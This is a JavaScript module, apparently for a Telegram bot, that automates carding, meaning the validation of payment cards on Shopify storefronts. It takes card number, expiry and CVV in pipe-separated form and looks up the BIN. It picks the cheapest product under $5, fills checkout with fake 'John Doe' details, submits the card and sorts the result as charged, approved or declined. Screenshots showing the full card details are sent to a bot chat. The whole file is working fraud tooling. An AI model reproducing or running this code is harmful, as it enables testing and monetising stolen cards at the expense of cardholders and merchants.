const axios = require("axios");
const puppeteer = require("puppeteer");

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function escapeHTML(str) {
  if (!str) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function parseCC(ccInput) {
  const parts = ccInput.split("|");
  if (parts.length < 4) return null;
  return {
    number: parts[0].trim(),
    month: parts[1].trim().padStart(2, "0"),
    year: parts[2].trim().length === 2 ? "20" + parts[2].trim() : parts[2].trim(),
    cvv: parts[3].trim()
  };
}

// BIN lookup
async function getBinInfo(bin) {
  try {
    const r = await axios.get("https://lookup.binlist.net/" + bin, {
      timeout: 5000,
      headers: { "Accept-Version": "3" }
    });
    if (r.data) {
      return {
        brand: (r.data.scheme || "VISA").toUpperCase(),
        issuer: (r.data.bank?.name || "BANK").toUpperCase(),
        country: (r.data.country?.name || "USA").toUpperCase(),
        flag: r.data.country?.emoji || ""
      };
    }
  } catch(e) {}
  return { brand: "VISA", issuer: "BANK", country: "USA", flag: "" };
}

// Classify response
function classifyResponse(responseText, approved) {
  const r = (responseText || "").toUpperCase();
  const chargedKw = ["CHARGED", "CAPTURED", "PAID", "PAYMENT_AUTHORIZED"];
  const approvedKw = [
    "APPROVED", "SUCCESS", "AUTHORIZED",
    "OTP_REQUIRED", "3DS_REQUIRED", "3D_SECURE",
    "AUTHENTICATION_REQUIRED", "PENDING", "REDIRECT",
    "INCORRECT_CVC", "INCORRECT_NUMBER"
  ];
  const declinedKw = [
    "DECLINED", "INSUFFICIENT", "DO NOT HONOR",
    "INVALID", "EXPIRED", "STOLEN", "BLOCKED",
    "RESTRICTED", "SECURITY", "CARD_DECLINED",
    "LOST", "PICKUP"
  ];

  for (const kw of chargedKw) if (r.includes(kw)) return "charged";
  for (const kw of declinedKw) if (r.includes(kw)) return "declined";
  for (const kw of approvedKw) if (r.includes(kw)) return "approved";
  if (approved) return "approved";
  return "declined";
}

// Screenshot helper
async function takeScreenshot(page) {
  try {
    return await page.screenshot({ encoding: "base64", type: "jpeg", quality: 70 });
  } catch(e) { return null; }
}

// Send screenshot to bot
async function sendScreenshot(bot, chatId, base64img, caption) {
  try {
    if (!base64img) return;
    const buf = Buffer.from(base64img, "base64");
    await bot.sendPhoto(chatId, buf, {
      caption: caption || "",
      parse_mode: "HTML"
    });
  } catch(e) {
    console.log("[SS ERROR]", e.message);
  }
}

// GET cheapest product via REST API
async function getProductREST(storeUrl) {
  try {
    const url = storeUrl.replace(/\/$/, "") + "/products.json?limit=100";
    const res = await axios.get(url, {
      timeout: 10000,
      headers: { "User-Agent": "Mozilla/5.0" }
    });
    const products = res.data?.products || [];
    if (!products.length) return null;

    let cheapest = null;
    for (const product of products) {
      for (const variant of (product.variants || [])) {
        const price = parseFloat(variant.price);
        if (price > 0 && price <= 5.00) {
          if (!cheapest || price < parseFloat(cheapest.price)) {
            cheapest = {
              id: variant.id,
              title: product.title,
              price: variant.price,
              variantId: variant.id,
              handle: product.handle
            };
          }
        }
      }
    }

    // Fallback — first product
    if (!cheapest) {
      const p = products[0];
      const v = p?.variants?.[0];
      if (v) cheapest = {
        id: v.id,
        title: p.title,
        price: v.price,
        variantId: v.id,
        handle: p.handle
      };
    }

    return cheapest;
  } catch(e) {
    console.log("[PRODUCT REST ERROR]", e.message);
    return null;
  }
}

// MAIN CHECK — Puppeteer with REST fallback
async function checkCard(ccInput, storeUrl, onStep, bot, chatId) {
  const startTime = Date.now();
  let binInfo = { brand: "VISA", issuer: "BANK", country: "USA", flag: "" };
  let browser = null;

  const card = parseCC(ccInput);
  if (!card) {
    return {
      success: false,
      response: "INVALID_FORMAT",
      category: "declined",
      binInfo,
      timeTaken: "0.00",
      product: null
    };
  }

  const bin = card.number.substring(0, 6);
  // BIN fetch parallel
  const binPromise = getBinInfo(bin).then(b => { binInfo = b; }).catch(() => {});

  try {
    // ============ STEP 1 — Launch Browser ============
    await onStep(
      "⏳ <b>Checking Card...</b>\n" +
      "━━━━━━━━━━━━━━━\n" +
      "💳 <b>Card:</b> <code>" + escapeHTML(ccInput) + "</code>\n" +
      "━━━━━━━━━━━━━━━\n" +
      "🔄 <b>[1/6]</b> Launching browser...\n" +
      "⬜⬜⬜⬜⬜⬜"
    );

    browser = await puppeteer.launch({
      headless: "new",
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-dev-shm-usage",
        "--disable-gpu",
        "--no-first-run",
        "--no-zygote",
        "--single-process"
      ]
    });

    const page = await browser.newPage();
    await page.setUserAgent(
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
    );
    await page.setViewport({ width: 1280, height: 720 });

    // ============ STEP 2 — Get Product ============
    await onStep(
      "⏳ <b>Checking Card...</b>\n" +
      "━━━━━━━━━━━━━━━\n" +
      "💳 <b>Card:</b> <code>" + escapeHTML(ccInput) + "</code>\n" +
      "━━━━━━━━━━━━━━━\n" +
      "✅ <b>[1/6]</b> Browser ready!\n" +
      "🔄 <b>[2/6]</b> Fetching products...\n" +
      "🟩⬜⬜⬜⬜⬜"
    );

    const product = await getProductREST(storeUrl);
    if (!product) {
      const ss = await takeScreenshot(page);
      await sendScreenshot(bot, chatId, ss, "❌ Step 2 — Product fetch failed");
      await browser.close();
      await binPromise;
      return {
        success: false,
        response: "NO_PRODUCT_FOUND",
        category: "declined",
        binInfo,
        timeTaken: ((Date.now() - startTime) / 1000).toFixed(2),
        product: null
      };
    }

    // ============ STEP 3 — Open Store & Add to Cart ============
    await onStep(
      "⏳ <b>Checking Card...</b>\n" +
      "━━━━━━━━━━━━━━━\n" +
      "💳 <b>Card:</b> <code>" + escapeHTML(ccInput) + "</code>\n" +
      "━━━━━━━━━━━━━━━\n" +
      "✅ <b>[1/6]</b> Browser ready!\n" +
      "✅ <b>[2/6]</b> Product: $" + product.price + "\n" +
      "🔄 <b>[3/6]</b> Adding to cart...\n" +
      "🟩🟩⬜⬜⬜⬜\n" +
      "🛒 <b>Item:</b> " + escapeHTML(product.title)
    );

    // Navigate to product page
    const productUrl = storeUrl.replace(/\/$/, "") + "/products/" + product.handle;
    await page.goto(productUrl, { waitUntil: "domcontentloaded", timeout: 20000 });
    await sleep(1500);

    // Screenshot — product page
    const ss1 = await takeScreenshot(page);
    await sendScreenshot(bot, chatId, ss1,
      "🛍 <b>[3/6]</b> Product Page\n💳 <code>" + escapeHTML(ccInput) + "</code>"
    );

    // Add to cart via fetch
    await page.evaluate(async (variantId) => {
      await fetch("/cart/add.js", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id: variantId, quantity: 1 })
      });
    }, product.variantId);

    await sleep(1000);

    // ============ STEP 4 — Checkout Page ============
    await onStep(
      "⏳ <b>Checking Card...</b>\n" +
      "━━━━━━━━━━━━━━━\n" +
      "💳 <b>Card:</b> <code>" + escapeHTML(ccInput) + "</code>\n" +
      "━━━━━━━━━━━━━━━\n" +
      "✅ <b>[1/6]</b> Browser ready!\n" +
      "✅ <b>[2/6]</b> Product: $" + product.price + "\n" +
      "✅ <b>[3/6]</b> Added to cart!\n" +
      "🔄 <b>[4/6]</b> Loading checkout...\n" +
      "🟩🟩🟩⬜⬜⬜"
    );

    await page.goto(storeUrl.replace(/\/$/, "") + "/checkout", {
      waitUntil: "networkidle2",
      timeout: 25000
    });
    await sleep(2000);

    // Screenshot — checkout page
    const ss2 = await takeScreenshot(page);
    await sendScreenshot(bot, chatId, ss2,
      "📋 <b>[4/6]</b> Checkout Page\n💳 <code>" + escapeHTML(ccInput) + "</code>"
    );

    // Fill contact/shipping
    const currentUrl = page.url();
    console.log("[CHECKOUT URL]", currentUrl);

    // Fill email if needed
    try {
      await page.waitForSelector('input[type="email"], input[name="email"], #email', { timeout: 5000 });
      await page.type('input[type="email"], input[name="email"], #email',
        "john" + Date.now() + "@gmail.com", { delay: 50 });
    } catch(e) { console.log("[EMAIL] Not found or already filled"); }

    // Fill name
    try {
      const firstNameSelectors = [
        'input[name="firstName"]',
        'input[id="firstName"]',
        'input[autocomplete="given-name"]',
        '#TextField1'
      ];
      for (const sel of firstNameSelectors) {
        try {
          await page.waitForSelector(sel, { timeout: 2000 });
          await page.type(sel, "John", { delay: 50 });
          break;
        } catch(e) {}
      }
    } catch(e) {}

    try {
      const lastNameSelectors = [
        'input[name="lastName"]',
        'input[id="lastName"]',
        'input[autocomplete="family-name"]',
        '#TextField2'
      ];
      for (const sel of lastNameSelectors) {
        try {
          await page.waitForSelector(sel, { timeout: 2000 });
          await page.type(sel, "Doe", { delay: 50 });
          break;
        } catch(e) {}
      }
    } catch(e) {}

    // Address
    try {
      const addrSelectors = [
        'input[name="address1"]',
        'input[autocomplete="shipping address-line1"]',
        '#TextField3'
      ];
      for (const sel of addrSelectors) {
        try {
          await page.waitForSelector(sel, { timeout: 2000 });
          await page.type(sel, "123 Main Street", { delay: 50 });
          break;
        } catch(e) {}
      }
    } catch(e) {}

    // City
    try {
      const citySelectors = [
        'input[name="city"]',
        'input[autocomplete="shipping address-level2"]',
        '#TextField5'
      ];
      for (const sel of citySelectors) {
        try {
          await page.waitForSelector(sel, { timeout: 2000 });
          await page.type(sel, "New York", { delay: 50 });
          break;
        } catch(e) {}
      }
    } catch(e) {}

    // ZIP
    try {
      const zipSelectors = [
        'input[name="zip"]',
        'input[name="postalCode"]',
        'input[autocomplete="shipping postal-code"]'
      ];
      for (const sel of zipSelectors) {
        try {
          await page.waitForSelector(sel, { timeout: 2000 });
          await page.type(sel, "10001", { delay: 50 });
          break;
        } catch(e) {}
      }
    } catch(e) {}

    await sleep(1500);

    // Click continue/next button
    try {
      const continueSelectors = [
        'button[type="submit"]',
        'button[data-trekkie-id="continue_to_shipping_button"]',
        '.step__footer__continue-btn',
        '#continue_button',
        'input[type="submit"]'
      ];
      for (const sel of continueSelectors) {
        try {
          await page.waitForSelector(sel, { timeout: 2000 });
          await page.click(sel);
          break;
        } catch(e) {}
      }
    } catch(e) {}

    await sleep(2000);
    await page.waitForNavigation({ timeout: 10000 }).catch(() => {});

    // ============ STEP 5 — Payment Page ============
    await onStep(
      "⏳ <b>Checking Card...</b>\n" +
      "━━━━━━━━━━━━━━━\n" +
      "💳 <b>Card:</b> <code>" + escapeHTML(ccInput) + "</code>\n" +
      "━━━━━━━━━━━━━━━\n" +
      "✅ <b>[1/6]</b> Browser ready!\n" +
      "✅ <b>[2/6]</b> Product: $" + product.price + "\n" +
      "✅ <b>[3/6]</b> Added to cart!\n" +
      "✅ <b>[4/6]</b> Checkout loaded!\n" +
      "🔄 <b>[5/6]</b> Filling payment...\n" +
      "🟩🟩🟩🟩⬜⬜"
    );

    // Navigate to payment if needed
    const payUrl = page.url();
    if (!payUrl.includes("payment") && !payUrl.includes("step=payment")) {
      try {
        await page.goto(payUrl.replace(/\/(contact|shipping)/, "/payment"), {
          waitUntil: "networkidle2", timeout: 15000
        });
        await sleep(2000);
      } catch(e) {}
    }

    // Screenshot — payment page
    const ss3 = await takeScreenshot(page);
    await sendScreenshot(bot, chatId, ss3,
      "💳 <b>[5/6]</b> Payment Page\n💳 <code>" + escapeHTML(ccInput) + "</code>"
    );

    // Fill card in iframe (Shopify uses iframes for card)
    let paymentResponse = "DECLINED";
    let category = "declined";

    try {
      // Wait for payment iframe
      await sleep(2000);

      // Try to find card number iframe
      const frames = page.frames();
      let cardFrame = null;

      for (const frame of frames) {
        const frameUrl = frame.url();
        if (frameUrl.includes("card") || frameUrl.includes("pay") ||
            frameUrl.includes("stripe") || frameUrl.includes("shopify")) {
          cardFrame = frame;
          break;
        }
      }

      if (cardFrame) {
        // Fill in iframe
        try {
          await cardFrame.waitForSelector('input[name="number"], input[placeholder*="Card"], input[data-elements-stable-field-name="cardNumber"]', { timeout: 5000 });
          await cardFrame.type('input[name="number"], input[placeholder*="Card"], input[data-elements-stable-field-name="cardNumber"]',
            card.number, { delay: 100 });
          await sleep(500);
          await cardFrame.type('input[name="expiry"], input[placeholder*="MM"], input[data-elements-stable-field-name="cardExpiry"]',
            card.month + card.year.slice(-2), { delay: 100 });
          await sleep(500);
          await cardFrame.type('input[name="verification_value"], input[placeholder*="CVV"], input[data-elements-stable-field-name="cardCvc"]',
            card.cvv, { delay: 100 });
        } catch(e) {
          console.log("[IFRAME FILL ERROR]", e.message);
        }
      } else {
        // No iframe — direct fill
        const cardSelectors = [
          'input[name="number"]',
          'input[id="number"]',
          'input[placeholder*="1234"]',
          'input[autocomplete="cc-number"]',
          '[data-testid="card-number-input"]'
        ];
        for (const sel of cardSelectors) {
          try {
            await page.waitForSelector(sel, { timeout: 2000 });
            await page.type(sel, card.number, { delay: 100 });
            break;
          } catch(e) {}
        }

        // Expiry
        try {
          await page.type('input[name="month"], input[placeholder*="MM"], input[autocomplete="cc-exp-month"]',
            card.month, { delay: 100 });
          await page.type('input[name="year"], input[placeholder*="YY"], input[autocomplete="cc-exp-year"]',
            card.year.slice(-2), { delay: 100 });
        } catch(e) {
          // Try combined expiry
          try {
            await page.type('input[name="expiry"], input[autocomplete="cc-exp"]',
              card.month + "/" + card.year.slice(-2), { delay: 100 });
          } catch(e2) {}
        }

        // CVV
        try {
          await page.type('input[name="verification_value"], input[name="cvv"], input[autocomplete="cc-csc"]',
            card.cvv, { delay: 100 });
        } catch(e) {}
      }

      await sleep(1500);

      // Screenshot before submit
      const ss4 = await takeScreenshot(page);
      await sendScreenshot(bot, chatId, ss4,
        "📤 <b>[5/6]</b> Card Filled — Submitting...\n💳 <code>" + escapeHTML(ccInput) + "</code>"
      );

      // Click Pay button
      const paySelectors = [
        'button[type="submit"]',
        'button[data-trekkie-id="payment_method_submit_button"]',
        '.step__footer__continue-btn',
        '#continue_button',
        'button:contains("Pay")',
        'button:contains("Complete")',
        'button:contains("Place")'
      ];

      for (const sel of paySelectors) {
        try {
          const btn = await page.$(sel);
          if (btn) {
            await btn.click();
            break;
          }
        } catch(e) {}
      }

      // Wait for response
      await sleep(5000);
      await page.waitForNavigation({ timeout: 15000 }).catch(() => {});
      await sleep(2000);

      // ============ STEP 6 — Get Result ============
      await onStep(
        "⏳ <b>Checking Card...</b>\n" +
        "━━━━━━━━━━━━━━━\n" +
        "💳 <b>Card:</b> <code>" + escapeHTML(ccInput) + "</code>\n" +
        "━━━━━━━━━━━━━━━\n" +
        "✅ <b>[1/6]</b> Browser ready!\n" +
        "✅ <b>[2/6]</b> Product: $" + product.price + "\n" +
        "✅ <b>[3/6]</b> Added to cart!\n" +
        "✅ <b>[4/6]</b> Checkout loaded!\n" +
        "✅ <b>[5/6]</b> Payment submitted!\n" +
        "🔄 <b>[6/6]</b> Getting result...\n" +
        "🟩🟩🟩🟩🟩⬜"
      );

      // Screenshot — result page
      const ss5 = await takeScreenshot(page);
      await sendScreenshot(bot, chatId, ss5,
        "🎯 <b>[6/6]</b> Result Page\n💳 <code>" + escapeHTML(ccInput) + "</code>"
      );

      const finalUrl = page.url();
      console.log("[FINAL URL]", finalUrl);

      // Check URL for result
      if (finalUrl.includes("thank_you") || finalUrl.includes("orders")) {
        paymentResponse = "APPROVED";
        category = "approved";
      } else {
        // Get page text for response
        const pageText = await page.evaluate(() => document.body.innerText);
        console.log("[PAGE TEXT SNIPPET]", pageText.substring(0, 500));

        // Check for error messages
        const errorSelectors = [
          '.notice--error', '.field__message--error',
          '[class*="error"]', '[class*="decline"]',
          '.payment-errors', '#error-message'
        ];

        let errorMsg = "";
        for (const sel of errorSelectors) {
          try {
            const el = await page.$(sel);
            if (el) {
              errorMsg = await page.evaluate(e => e.innerText, el);
              if (errorMsg.trim()) break;
            }
          } catch(e) {}
        }

        if (!errorMsg) {
          // Check page text for keywords
          const upperText = pageText.toUpperCase();
          if (upperText.includes("THANK YOU") || upperText.includes("ORDER CONFIRMED")) {
            paymentResponse = "APPROVED";
          } else if (upperText.includes("3D SECURE") || upperText.includes("AUTHENTICATION")) {
            paymentResponse = "3DS_REQUIRED";
          } else if (upperText.includes("OTP")) {
            paymentResponse = "OTP_REQUIRED";
          } else if (upperText.includes("DECLINED") || upperText.includes("FAILED")) {
            paymentResponse = "CARD_DECLINED";
          } else {
            paymentResponse = "DECLINED";
          }
        } else {
          paymentResponse = errorMsg.trim().toUpperCase();
        }

        category = classifyResponse(paymentResponse, false);
      }

    } catch(e) {
      console.log("[PAYMENT FILL ERROR]", e.message);
      paymentResponse = "PAYMENT_PAGE_ERROR: " + e.message;
      category = "declined";
    }

    await binPromise;

    return {
      success: true,
      response: paymentResponse,
      category,
      product,
      binInfo,
      timeTaken: ((Date.now() - startTime) / 1000).toFixed(2)
    };

  } catch(err) {
    console.error("[MAIN ERROR]", err.message);

    // Screenshot on error
    if (browser) {
      try {
        const pages = await browser.pages();
        if (pages[0]) {
          const errSs = await takeScreenshot(pages[0]);
          await sendScreenshot(bot, chatId, errSs,
            "❌ <b>Error occurred at step</b>\n<code>" + escapeHTML(err.message) + "</code>"
          );
        }
      } catch(e) {}
    }

    await binPromise;
    return {
      success: false,
      response: "ERROR: " + err.message,
      category: "declined",
      binInfo,
      timeTaken: ((Date.now() - startTime) / 1000).toFixed(2),
      product: null
    };

  } finally {
    if (browser) {
      try { await browser.close(); } catch(e) {}
    }
  }
}

module.exports = { checkCard, classifyResponse };
